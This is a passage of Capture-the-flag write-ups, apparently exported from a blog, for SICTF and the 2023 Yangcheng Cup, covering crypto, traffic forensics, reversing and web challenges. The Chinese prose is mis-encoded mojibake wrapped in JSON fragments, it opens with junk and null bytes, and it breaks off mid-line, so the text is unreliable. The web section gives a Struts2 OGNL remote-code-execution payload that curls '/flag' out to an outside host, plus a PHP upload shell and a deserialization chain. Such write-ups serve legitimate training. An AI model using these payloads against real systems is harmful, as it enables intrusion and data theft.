!!!!!!!!!...........!.?...............!?!!.?..............?.?!.?!.!!!!!.!!!!!.......!.!!!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?.................!?!!.?................?.?!.?............!.?.\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27; åœ¨çº¿ookè§£ç ï¼Œå¾—flagï¼šSICTF&#123;0141ac35-ec19-4cee-a906-22805fdbed77&#125;ã€‚ â€‹ ä¸€èµ·ä¸Šå·ä¸Cobalt Strikeæµé‡åˆ†æï¼Œå‚è€ƒï¼šhttps://blog.scrt.ch/2023/04/01/hex-filtrate/ æå–å‡ºæœ€åä¸€ä¸ªæµé‡Œçš„keyï¼Œè§£æcookieï¼š python3 cs-decrypt-metadata.py U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s= -f key æ‹¿åˆ°Raw keyåï¼Œå†åˆ†ææµé‡æ–‡ä»¶ï¼š python3 cs-parse-traffic.py -r 1ddb06c55884caf491bdb370ca48389c 11.pcapng å¾—åˆ°flagï¼šSICTF&#123;88a39373-e204-43b6-b321-33ac8972fde9&#125; â€‹ baby_zipéƒ¨åˆ†æ˜æ–‡æ”»å‡»ï¼Œ1.png ä¸ºpngå›¾ç‰‡å‰18å­—èŠ‚ï¼š rbkcrack -C flag.zip -c flag.png -p 1.png å¾—åˆ°keyåå†æå–ï¼š rbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png flagï¼šSICTF&#123;3a4998b8-345e-4943-a689-d01e8b08defb&#125; â€‹ è¿˜ä¸ä¸Šå·flag1.pcapngæ˜¯å†°èæµé‡ï¼Œflag2.pcapngæ˜¯CSæµé‡ã€‚ å…ˆçœ‹flag2.pcapngï¼Œæå– key.zip è§£å‹ï¼Œkey ä¸­æœ‰é›¶å®½å­—ç¬¦éšå†™ï¼Œå¾—åˆ° cd52f1488563bf0eï¼Œæ˜¯å†°èæµé‡çš„keyã€‚ flag1.pcapngä¸­ï¼Œå‚è€ƒEasy_Sharkè§£å¯†ä»£ç ï¼š 123456&lt;?php $key=&quot;cd52f1488563bf0e&quot;; $post=&quot;...&quot;; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); print_r(base64_decode(json_decode($post, true)[&#x27;msg&#x27;]));?&gt; å°†å“åº”æ•°æ®åŒ…ä¸­çš„base64å­—ç¬¦ä¸²å¸¦å…¥å¾—åˆ°å„æµçš„è§£å¯†å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930313233343536# æµ2dvwa_email.pngflag.txtkeyshell.php# æµ4SICTF&#123;79e1755e-08a8-4d# æµ6rO0ABXNyABRzbGVlcC5ydW50aW1lLlNjYWxhcryvNaxLcOBGAwADTAAFYXJyYXl0ABtMc2xlZXAvcnVudGltZS9TY2FsYXJBcnJheTtMAARoYXNodAAaTHNsZWVwL3J1bnRpbWUvU2NhbGFySGFzaDtMAAV2YWx1ZXQAGkxzbGVlcC9ydW50aW1lL1NjYWxhclR5cGU7eHBzcgAec2xlZXAuZW5naW5lLnR5cGVzLk9iamVjdFZhbHVluXko22Ba54kCAAFMAAV2YWx1ZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwc3IAFWphdmEuc2VjdXJpdHkuS2V5UGFpcpcDDDrSzRKTAgACTAAKcHJpdmF0ZUtleXQAGkxqYXZhL3NlY3VyaXR5L1ByaXZhdGVLZXk7TAAJcHVibGljS2V5dAAZTGphdmEvc2VjdXJpdHkvUHVibGljS2V5O3hwc3IAFGphdmEuc2VjdXJpdHkuS2V5UmVwvflPs4iapUMCAARMAAlhbGdvcml0aG10ABJMamF2YS9sYW5nL1N0cmluZztbAAdlbmNvZGVkdAACW0JMAAZmb3JtYXRxAH4ADUwABHR5cGV0ABtMamF2YS9zZWN1cml0eS9LZXlSZXAkVHlwZTt4cHQAA1JTQXVyAAJbQqzzF/gGCFTgAgAAeHAAAAJ6MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAL0M6FR0Cb9dW52Nd5NTA1JUNAs1thS8iXx6QB+UkN/vRJdfsKS8dnOfNuPuPDCtx26B2j8I1FuTJ1VrrfDkzN585sskmXYronFM98Dx50vHaadOcDcDdBBqi8gC5/D3iKflX6T9pSL/5PVLfN1EIaFsyAS9jpWX2wGNi3C/QPSrAgMBAAECgYAdNhXeGtH4wkWqOhY8aurL+VvTUZjRanJ6C+/FkXCzUWbRVwVV5xMMeZEDNigRw4BZ2HGvJL+faMT+o3VMkCYBhGbi2/3RPRgigMG7Aa3LWWtYWsdbw8Mw6aqqbTjDUHrQ1kulMf1JvXJL5LBd+pBAQ8kHaYJRMcmnLsT4NeXOFQJBAMNa2r+phrThTlagMB6bj6vl0IVbDy+TJT2VybCSJ76rPgVUQwtPyX3z7UAjt27mE8KK+k7Jidi0drCEPv5Wo60CQQD3vQbO64fko1dlatkNn095GO9KoCuanrsLs+vYOhc0ltk4EhHHmP5hEE6dSMZNASKaN0wSYJ14xjnA+dJWOES3AkEApzyYF4vhLefTUIVBrHIvxFCw+fjCP1AQiXA5gVcdfzTJm3ZPDtf2/kRbzpTE68M7F0gykFAoGcQj92i/JKy24QJAdyVbA+M07Ro9qxHzJ+EJmMUMOMjFj8xtStiSQeDWTj2KZLQUBvmmxcnQ9UYN0PUNzjtwA5qhwXccSZoctcjECwJAZc0TZgGq/OwgnIyj/1+Q9D0A2eg3aw1k+6Vzkf/DdkuF6+XTkYTlBGiETIK/vm1rCH4NcOCL7eK5qpA1grg+gnQABlBLQ1MjOH5yABlqYXZhLnNlY3VyaXR5LktleVJlcCRUeXBlAAAAAAAAAAASAAB4cgAOamF2YS5sYW5nLkVudW0AAAAAAAAAABIAAHhwdAAHUFJJVkFURXNxAH4ADHEAfgARdXEAfgASAAAAojCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAvQzoVHQJv11bnY13k1MDUlQ0CzW2FLyJfHpAH5SQ3+9El1+wpLx2c5824+48MK3HboHaPwjUW5MnVWut8OTM3nzmyySZdiuicUz3wPHnS8dpp05wNwN0EGqLyALn8PeIp+VfpP2lIv/k9Ut83UQhoWzIBL2OlZfbAY2LcL9A9KsCAwEAAXQABVguNTA5fnEAfgAVdAAGUFVCTElDcHB4 å°†æµ6ä¿å­˜ï¼Œä¸ºflag2.pcapngçš„å®é™…keyã€‚ å›åˆ°flag2.pcapngï¼Œè§£æcookieï¼š python3 cs-decrypt-metadata.py j+ojKDVPlCr7lT9yzNinkj1DgdkcRaLMT2kL4U+9TvdFBZqGKk7/4WF/W7JhEieC3DoRfngRppMAVHa3yfhp4HZm/ZeNY4bc8rlYL11Q0dXDzpR5JjhqN+hGe9RBqPznoukShgQLhxT/DO7djxE5ROzi6NC52yZAaGPCSeLDyjg= -f realkey æ‹¿åˆ°Raw keyåï¼Œå†åˆ†ææµé‡æ–‡ä»¶ï¼š python3 cs-parse-traffic.py -r dfc36399da501802482005cf8c768086 flag2.pcapng å¾—åˆ°å…³é”®å†…å®¹ï¼š F 0 09/06/2023 15:52:58 GNSC2OJTHA2S2NDDGA2TIMJVGQ4TSOJVPU====== base32è§£ç å¾—ååŠéƒ¨åˆ†flagï¼š3d-9385-4c0541549995&#125; flagï¼šSICTF&#123;79e1755e-08a8-4d3d-9385-4c0541549995&#125; â€‹ Easy_Sharkå†°èæµé‡ï¼Œç…§ç€ç¬¬ä¸€ä¸ªæµçš„PHPåŠ å¯†é€»è¾‘ä»£ç è¿˜åŸï¼š 123456&lt;?php $key=&quot;2295d22e2d70888f&quot;; $post=&quot;...&quot;; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); print_r(base64_decode(json_decode($post, true)[&#x27;msg&#x27;]));?&gt; å°†å“åº”æ•°æ®åŒ…ä¸­çš„base64å­—ç¬¦ä¸²å¸¦å…¥å¾—åˆ°å„æµçš„è§£å¯†å†…å®¹ï¼š 12345678910GronKey.txtdvwa_email.pngflag.txtshell.php# flag.txtTGLBOMSJNSRAJAZDEZXGHSJNZWHG# GronKey.txt1,50,61,8,9,20,63,41 GronsfeldåŠ å¯†ï¼Œæ›¿æ¢æˆVigenereåŠ å¯†ï¼š 123456789s = [1,50,61,8,9,20,63,41]import stringdic = string.ascii_lowercasekey = &#x27;&#x27;for k in s: key += dic[k%26]print(key)# byjijulp Vigenereè§£å¯†ï¼Œå¾— SICTFSHUMUISAGOODBOYYYYYYYYYã€‚ flagï¼šSICTF&#123;SHUMUISAGOODBOYYYYYYYYY&#125; â€‹ fast_morseaudacityè°ƒæ…¢é€Ÿåº¦ï¼Œå†åœ¨çº¿è¯†åˆ«morseï¼Œå¾—åˆ° f2a09bf-7f4a-4269-93a5-c8a48360b03cã€‚ â€‹ QR_QR_QRäº¤äº’å¼01å­—ç¬¦ä¸²è¿˜åŸäºŒç»´ç ï¼Œä¸”æäº†1000å±‚â€¦ 12345678910111213141516171819202122232425262728293031from pwn import *from PIL import Imagefrom pyzbar.pyzbar import decoder = remote(&#x27;210.44.151.51&#x27;,10144)for i in range(1000): print(i) x = r.recvuntil(b&#x27;Please&#x27;)[:-7].split(b&#x27;\\n&#x27;) MAX = len(x) pic = Image.new(&quot;RGB&quot;,(MAX,MAX)) s = b&#x27;&#x27;.join(x) i = 0 for y in range(0,MAX): for x in range(0,MAX): if(s[i] == ord(&#x27;0&#x27;)): pic.putpixel((x,y),(0,0,0)) else: pic.putpixel((x,y),(255,255,255)) i = i+1 pic.save(&quot;flag.png&quot;) decocdeQR = decode(Image.open(&quot;flag.png&quot;)) data = decocdeQR[0].data print(data) r.sendlineafter(b&#x27;code:&#x27;,data) print(r.recvline())r.interactive() â€‹ é—®å·è°ƒæŸ¥SICTF&#123;SICTF_Round3_will_do_even_better!&#125; â€‹ CRYPTO[ç­¾åˆ°]å¤å…¸å¤§æ‚çƒ©base100-base62-base64-base58-base32-base62 SICTF&#123;fe853b49-8730-462e-86f5-fc8e9789f077&#125; â€‹ RadioCRT 12345678910111213n1 = n2 = n3 = c1 = c2 = c3 = e = 17mm = crt([c1,c2,c3],[n1,n2,n3])m = mm.nth_root(e, truncate_mode=True)print(bytes.fromhex(hex(m[0])[2:]))# b&#x27;SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;&#x27; â€‹ MingTianPaoMTP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import Crypto.Util.strxor as xoimport libnum, codecs, numpy as npdef isChr(x): if ord(&#x27;a&#x27;) &lt;= x and x &lt;= ord(&#x27;z&#x27;): return True if ord(&#x27;A&#x27;) &lt;= x and x &lt;= ord(&#x27;Z&#x27;): return True return Falsedef infer(index, pos): if msg[index, pos] != 0: return msg[index, pos] = ord(&#x27; &#x27;) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(&#x27; &#x27;)def know(index, pos, ch): msg[index, pos] = ord(ch) for x in range(len(c)): if x != index: msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)dat = []def getSpace(): for index, x in enumerate(c): res = [xo.strxor(x, y) for y in c if x!=y] f = lambda pos: len(list(filter(isChr, [s[pos] for s in res]))) cnt = [f(pos) for pos in range(len(x))] for pos in range(len(x)): dat.append((f(pos), index, pos))c = [codecs.decode(x.strip().encode(), &#x27;hex&#x27;) for x in open(&#x27;Problem.txt&#x27;, &#x27;r&#x27;).readlines()]msg = np.zeros([len(c), len(c[0])], dtype=int)getSpace()dat = sorted(dat)[::-1]for w, index, pos in dat: infer(index, pos)know(1, 28, &#x27;a&#x27;)know(1, 24, &#x27;e&#x27;)know(1, 16, &#x27;t&#x27;)know(0, 10, &#x27; &#x27;)know(0, 12, &#x27;i&#x27;)print(&#x27;\\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))key = xo.strxor(c[0], &#x27;&#x27;.join([chr(c) for c in msg[0]]).encode())print(key)# Little Red Riding Hood promise# d to obey her mother. The gran# dmother lived out in the woods# , a half hour from the village# . When Little Red Riding Hood # entered the woods a wolf came # up to her. She did not know wh# at a wicked animal he was, and# was not afraid of him. &quot;Good # day to you, Little Red Riding # b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27; â€‹ Easy_CopperSmithcoppersmithè§£å·²çŸ¥pé«˜ä½æ”»å‡»ã€‚ 12345678910111213141516n = c = ph = e = 65537PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (ph &lt;&lt; 230) + xpl = f.small_roots(X=2^230, beta=0.48, epsilon=0.02)[0]p = (ph &lt;&lt; 230) + plq = n//int(p)f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;&#x27; â€‹ ç­¾åˆ°é¢˜æ¥å’¯ï¼Related Message Attackï¼ˆFranklin-Reiteræ”»å‡»ï¼‰ï¼Œçˆ†ç ´å° $e$ã€‚ 123456789101112131415161718192021222324252627n = c1 = c2 = import binasciidef attack(c1, c2, n, e): PR.&lt;x&gt;=PolynomialRing(Zmod(n)) g1 = (114*x+2333)^e - c1 g2 = (514*x+4555)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]e = 2while e &lt; 2^10: m = attack(c1, c2, n, e) m = binascii.unhexlify(&quot;%x&quot; % int(m)) if m.isascii(): print(m) break e = next_prime(e) # SICTF&#123;hhh!!franklin_reiter_is_easy&#125; â€‹ small_eç›´æ¥å° $e$ æ”»å‡» 1234567import gmpy2e = 3c = m = gmpy2.iroot(c,3)[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;SICTF&#123;2ca8e589-4a31-4909-80f0-9ecfc8f8cb37&#125;&#x27; â€‹ easy_mathæ ¹æ® $\\begin{cases} h_1=a_1p+b_1q \\newline h_2=a_2p+b_2q \\end{cases}$ æ¶ˆæ‰ $p$ï¼Œæœ‰ $(a_2b_1-a_1b_2)q=a_2h_1-a_1h_2$ï¼Œç”±äº $a_1,a_2$ ä¸ºç´ æ•°ä¸” $a_1,a_2 \\in [2^{12},2^{13})$ï¼Œåˆ $\\gcd(a_2h_1-a_1h_2,n)=q$ï¼Œçˆ†ç ´ $a_1,a_2$ å³å¯æ±‚ $q$ã€‚ 1234567891011121314151617181920n = h1 = h2 = c = primes = []for k in Primes(): if k&gt;=2^12: primes.append(k) if k&gt;2^13: breakfor i in range(len(primes)): for j in range(len(primes)): x = abs(h1*primes[i]-h2*primes[j]) q = gcd(x,n) if q &gt; 1: print(primes[i],primes[j],q)# 5953 4241 8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437 å¸¸è§„è§£RSAï¼Œå¾—flagï¼šSICTF&#123;452aebb6-9c16-441a-ac42-fc608bf6063f&#125; â€‹ WEB[ç­¾åˆ°]IncludePHPä¼ªåè®®è¯» /flagï¼š ?SICTF=php://filter/resource=/flag â€‹ Baby_PHPPOST /?k%20e%20y=123%0a&amp;b=phpinfo(); command=print_r(file_get_contents(array_rand(array_flip(scandir(current(localeconv())))))); â€‹ ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—æ¡ä»¶ç«äº‰ã€‚ ä¸Šä¼  1.php ï¼Œå†…å®¹ä¸º &lt;?php system(&quot;cat /flag&quot;);ï¼ŒbpæŠ“åŒ…ï¼›è®¿é—® uploads/1.php ï¼ŒbpæŠ“åŒ…ã€‚ ä¸Šé¢ä¸¤ä¸ªåŒ…åˆ†åˆ«åœ¨bp intruderç”¨null payloadsçˆ†ç ´1000æ¬¡ï¼Œæ‰¾åˆ° uploads/1.php çˆ†ç ´ç»“æœä¸­å“åº”ç 200çš„é‚£ä¸ªæ•°æ®åŒ…ï¼Œå³ä¸ºflagå€¼ã€‚ â€‹ painStruts2åŸºäºOGNLçš„RCEæ¼æ´ï¼Œå‚è€ƒhttps://www.freebuf.com/vuls/217482.html S2-012çš„payloadå¯ç”¨ï¼š 1(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;curl http://[IP]:[PORT]/?p=`cat /flag`&quot;&#125;)).start() unicodeç¼–ç ç»•è¿‡é»‘åå•å…³é”®å­—è¿‡æ»¤ï¼Œå†æ ¹æ®æºç çš„urldecodeï¼Œurlencodeä¸€å±‚ï¼Œpayloadï¼š /start?payload=%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0053%5Cu0074%5Cu0072%5Cu0069%5Cu006e%5Cu0067%5Cu005b%5Cu005d%5Cu007b%5Cu0022%5Cu0062%5Cu0061%5Cu0073%5Cu0068%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu002d%5Cu0063%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu0063%5Cu0075%5Cu0072%5Cu006c%5Cu0020%5Cu0068%5Cu0074%5Cu0074%5Cu0070%5Cu003a%5Cu002f%5Cu002f%5Cu0031%5Cu0032%5Cu0030%5Cu002e%5Cu0032%5Cu0035%5Cu002e%5Cu0031%5Cu0030%5Cu0034%5Cu002e%5Cu0032%5Cu0030%5Cu0039%5Cu003a%5Cu0038%5Cu0038%5Cu0038%5Cu0038%5Cu002f%5Cu003f%5Cu0070%5Cu003d%5Cu0060%5Cu0063%5Cu0061%5Cu0074%5Cu0020%5Cu002f%5Cu0066%5Cu006c%5Cu0061%5Cu0067%5Cu0060%5Cu0022%5Cu007d%5Cu0029%5Cu0029%5Cu002e%5Cu0073%5Cu0074%5Cu0061%5Cu0072%5Cu0074%5Cu0028%5Cu0029 å¾—åˆ°ç»“æœï¼š 210.44.151.51 - - [09/Sep/2023 12:30:07] &quot;GET /?p=SICTF169e8299-2241-4b2e-9726-1c32f212ca51 HTTP/1.1&quot; 200 - â€‹ RCEPOST / code=include &quot;/flag&quot;; â€‹ æˆ‘å…¨éƒ½è¦å†™ååºåˆ—åŒ–é“¾ï¼š 1234567891011121314151617181920from phpserialize import serializeclass P: public_MyLover=&#x27;x&#x27; class B: public_i=&#x27;1&#x27; public_nogame=P() class A: public_Aec=B() public_girl=[&#x27;1&#x27;] public_boy=[&#x27;2&#x27;] class B: public_pop=A() print(serialize(B()))# O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125; POST ?A_B_C=O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125; cmd=system(&quot;cat /flag&quot;); â€‹ REVERSE[ç­¾åˆ°]PYCpycåç¼–è¯‘ï¼Œå¾—flagã€‚ SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125; â€‹ MyobjectåŠ¨è°ƒï¼Œå‘ç°æ˜¯RC4ï¼Œkeyä¸º SIFLAGï¼Œå¯†æ–‡ä¸º 3027D30E5A22CF47476B0BE58D53BA99C3850707011C7710FE889Fã€‚ è§£å¯†RC4ï¼Œå¾—flagï¼šSICTF&#123;wow_you_get_the_flag&#125;ã€‚ â€‹ chbaseæœç´¢å­—ç¬¦ä¸²å¾— ç è¡¨ï¼šZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/ å¯†æ–‡ï¼šF0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9 base64è§£ç å¾—flagï¼šSICTF&#123;base64_and_antidebugger&#125; â€‹ ä¸ä¸€æ ·çš„base64pyinstxtractorè§£åŒ…å¾—åˆ°111.pycï¼Œåç¼–è¯‘å¾—åˆ°ï¼š U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA base64è§£ç å¾—flagï¼šSICTF&#123;8e0d358d-8b9d-4866-9b02-6749b07ad09a&#125; â€‹ javacodeJVMå­—èŠ‚ç ï¼Œå‚è€ƒ ä¸¤å¼ å›¾è®©ä½ å¿«é€Ÿè¯»æ‡‚JVMå­—èŠ‚ç æŒ‡ä»¤ ç†åŠ å¯†é€»è¾‘ï¼Œå·²çŸ¥keyå’Œå¯†æ–‡cï¼Œå…³é”®è¿ç®—ä¸ºï¼š c[i] = (((m[i]^m[i+1])-k[i])^k[i])%256 è¿˜åŸï¼š 1234567891011121314151617c = [148,136,151,234,177,48,226,234,214,177,168,176,151,250,19,20,253,52,72,176,170,140,176,236,54,231,212,237,135,151,150,135,217,231,229,32,90]k = list(b&#x27;SICTF2023&#x27;)import stringdic = string.ascii_letters+string.digits+&#x27;_&#123;&#125;&#x27;m = [83]for i in range(len(c)): for j in range(33,127): if (((m[-1]^j)-k[i%len(k)])^k[i%len(k)])%256 == c[i]: m.append(j) breakprint(bytes(m))# b&#x27;SICTF&#123;OMG_j@vac0de_1s_sO_interesting!&#125;&#x27; â€‹ PWN[ç­¾åˆ°]Shopæ•´æ•°æº¢å‡ºæ¼æ´ï¼Œè¾“å…¥-1å¾—flagã€‚ â€‹ FORENSICSè´­ç‰©ä¹‹æ—…ç™¾åº¦è¯†å›¾+å…³é”®å­—æœç´¢ã€‚ SICTF&#123;åŒ—äº¬å¸‚_é¡ºä¹‰åŒº_æ–°é¡ºå—å¤§è¡—_åŒ—äº¬åè”é¡ºä¹‰é‡‘è¡—è´­ç‰©ä¸­å¿ƒ&#125; â€‹ å¤©æ¡¥è¾¨è®¤å‡ºæ¢§æ¡æ ‘ï¼Œå†å…³é”®å­—æœç´¢åŸå¸‚ã€‚ SICTF&#123;é™•è¥¿çœè¥¿å®‰å¸‚ç¢‘æ—åŒºå‹è°Šè·¯&#125; â€‹ ç¾å¥³å§å§O.oç™¾åº¦è¯†å›¾+å…³é”®å­—æœç´¢ã€‚ SICTF&#123;ç¦å»ºçœç¦å·å¸‚ä»“å±±åŒºçƒŸå°å±±å…¬å›­&#125; â€‹ å®å¡”é•‡æ²³å¦–ç™¾åº¦è¯†å›¾+å…³é”®å­—æœç´¢ã€‚ SICTF&#123;å±±ä¸œçœæµå®å¸‚æ±¶ä¸Šå¿å¤ªå­çµè¸ªå¡”&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2023å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›","slug":"match-2023å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›","date":"2023-09-02T15:19:34.000Z","updated":"2023-09-03T02:23:43.500Z","comments":true,"path":"2023/09/02/match-2023å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›/","permalink":"https://lazzzaro.github.io/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"â€‹ ç«èµ›æ—¶é—´ 2023-09-02 09:00:00~2023-09-03 09:00:00 ç«èµ›ç®€ä»‹ ç›®å‰æˆ‘å›½ç½‘æ°‘è§„æ¨¡å·²çªç ´9äº¿ï¼Œæˆä¸ºåå‰¯å…¶å®çš„ç½‘ç»œå¤§å›½ï¼Œä½†æˆ‘å›½ä¸ç½‘ç»œå¼ºå›½ç›¸æ¯”è¿˜æœ‰ä¸€å®šè·ç¦»ã€‚ä¹ è¿‘å¹³æ€»ä¹¦è®°æŒ‡å‡ºï¼šè¦å»ºç«‹é«˜ç´ è´¨ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–äººæ‰é˜Ÿä¼ï¼Œå°†æˆ‘å›½å»ºè®¾æˆç½‘ç»œå¼ºå›½ã€‚å»ºè®¾ç½‘ç»œå¼ºå›½éœ€è¦é«˜ç´ è´¨çš„ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–äººæ‰é˜Ÿä¼ã€‚ç½‘ç»œå®‰å…¨äººæ‰æ˜¯å›½å®¶ç½‘ç»œå®‰å…¨å»ºè®¾çš„æ ¸å¿ƒèµ„æºï¼Œå…¶æ•°é‡ã€è´¨é‡å’Œç»“æ„æ˜¯è¡¡é‡å›½å®¶ç½‘ç»œå®‰å…¨è½¯å®åŠ›å’Œç«äº‰åŠ›çš„é‡è¦æ ‡å¿—ã€‚ ä¸ºç§¯æå“åº”å›½å®¶ç½‘ç»œå¼ºå›½å»ºè®¾å¯¹ç½‘ç»œå®‰å…¨äººæ‰çš„éœ€æ±‚ï¼Œæå‡äººæ°‘çš„ç½‘ç»œå®‰å…¨çŸ¥è¯†æ°´å¹³å’Œå®è·µåŠ›ï¼Œç‰¹ä¸¾åŠ2023å¹´â€œç¾ŠåŸæ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›ã€‚ MISCEZ_misc ä¸€é“ç®€å•çš„miscæ.. 16è¿›åˆ¶æŸ¥çœ‹ï¼Œæœ«å°¾ä¿®æ”¹ 504b0403 ä¸º 504b0304 åæå–å‡ºzipæ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸²å¯†æ–‡ vzbtrvplnnvphsqkxsiqibroouã€‚ æ ¹æ®å›¾ç‰‡åGronså’Œå‹ç¼©åŒ…å†…æ–‡ä»¶åfeldï¼Œç»„åˆå¾—åˆ°Gronsfeldä¸ºä¸€ç§å¯†ç ï¼Œçˆ†ç ´å¯†é’¥å¾—åˆ°æç¤ºï¼štry to think the s nipping toolsï¼Œä¸ºWin10/11æˆªå›¾å·¥å…·æ¼æ´aCropalypseï¼ˆCVE-2023-28303ï¼‰ã€‚ åˆ©ç”¨Acropalypse Multi Toolå·¥å…·ä¿®å¤pngå®½é«˜ï¼Œè¿˜åŸå¾—åˆ°flagï¼š â€‹ CRYPTODanger_RSA çœ‹ä¼¼ç®€å•çš„rsa 1234567891011121314151617181920212223242526from Crypto.Util.number import *m = bytes_to_long(flag)def get_key(a, nbit): assert a &gt;= 2 while True: X = getRandomInteger(nbit // a) s = getRandomRange(pow(2, a ** 2 - a + 4), pow(2, a ** 2 - a + 5)) p = X ** a + s if isPrime(p): return (p, s)p, s = get_key(a, 1024)q, t = get_key(a, 1024)N = p * qe = s * tc = pow(m, e, N)print(&quot;N =&quot;, N)print(&quot;e =&quot;, e)print(&quot;c =&quot;, c)# N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223# e = 11079917583# c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766 $N$ ä¸º2038ä½ï¼Œ$p,q$ è‡³å°‘ä¸º1024ä½ï¼Œä¸”ç”Ÿæˆå‡½æ•° get_key() çš„ $p=X^a+s$ æœ‰ $X^a \\gt\\gt s$ï¼Œä¸” $e$ ä¸º34ä½ï¼Œ$s&lt;e$ï¼Œæ•… $a$ å€¼ä¸ä¼šå¤ªå¤§ï¼Œå°è¯•çˆ†ç ´ $a$ å€¼ï¼š 1234567891011121314151617181920212223from Crypto.Util.number import *N = 